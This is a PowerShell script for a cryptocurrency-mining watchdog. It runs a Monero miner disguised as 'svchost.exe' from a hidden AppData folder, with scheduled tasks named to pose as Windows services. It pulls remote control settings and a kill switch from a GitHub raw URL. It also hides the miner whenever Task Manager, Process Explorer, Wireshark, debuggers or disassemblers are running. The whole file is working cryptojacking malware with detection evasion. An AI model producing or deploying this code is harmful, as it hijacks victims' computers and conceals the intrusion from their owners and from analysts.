<#
.SYNOPSIS
    XMR Miner Watchdog Loop & Remote Telemetry Sync v2.0
#>
$ErrorActionPreference = "SilentlyContinue"
$InstallDir = "$env:APPDATA\WindowsServices"
$ConfigPath = "$InstallDir\config.json"
$GithubRawConfig = "https://raw.githubusercontent.com/aurastriker/test/main/config.json"

while ($true) {
    try {
        $RemoteCfg = Invoke-RestMethod -Uri$GithubRawConfig -TimeoutSec 15 -ErrorAction Stop
        if ($RemoteCfg.killSwitch -eq$true) {
            Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
            Unregister-ScheduledTask -TaskName "WindowsServiceUpdate" -Confirm:$false -ErrorAction SilentlyContinue
            Unregister-ScheduledTask -TaskName "WindowsServiceMonitor" -Confirm:$false -ErrorAction SilentlyContinue
            Remove-Item "$InstallDir" -Recurse -Force -ErrorAction SilentlyContinue
            exit
        }
        $RemoteJson =$RemoteCfg | ConvertTo-Json -Depth 5
        $LocalJson = Get-Content$ConfigPath -Raw
        if ($RemoteJson -ne$LocalJson) {
            Set-Content -Path $ConfigPath -Value$RemoteJson
            Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
        }
    } catch {}

    $BadProcs = @('taskmgr', 'processhacker', 'procexp', 'procexp64', 'procmon', 'procmon64', 'wireshark', 'perfmon', 'resmon', 'tcpview', 'autoruns', 'autoruns64', 'filemon', 'regmon', 'pestudio', 'x64dbg', 'x32dbg', 'ollydbg', 'ida', 'ida64', 'ghidra', 'fiddler', 'charles', 'httpdebugger')
    $RunningBad = Get-Process -Name$BadProcs -ErrorAction SilentlyContinue
    $Battery = Get-WmiObject -Class Win32_Battery -ErrorAction SilentlyContinue$OnBattery = $Battery -and ($Battery.BatteryStatus -eq 1)

    if ($RunningBad -or$OnBattery) {
        Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 60
        continue
    }

    if (-not (Get-Process -Name "svchost" -ErrorAction SilentlyContinue)) {
        Start-Process -FilePath "$InstallDir\svchost.exe" -ArgumentList "-c `"$ConfigPath`"" -WindowStyle Hidden
    }

    Start-Sleep -Seconds 30
}
